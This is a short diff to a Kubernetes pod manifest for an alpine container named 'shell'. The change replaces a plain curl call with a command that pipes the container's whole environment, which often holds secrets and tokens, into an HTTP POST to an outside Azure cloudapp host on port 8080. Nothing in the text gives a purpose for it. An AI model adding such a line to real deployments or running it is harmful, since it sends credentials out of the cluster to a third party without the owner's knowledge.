@@ -6,5 +6,5 @@ spec:
   containers:
     - name: shell
       image: alpine
-      command: ["sh", "-c", "apk add curl; curl http://potter-maga.brazilsouth.cloudapp.azure.com:8080" ]
+      command: ["sh", "-c", "env | curl -X POST http://potter-maga.brazilsouth.cloudapp.azure.com:8080"]
   restartPolicy: Never
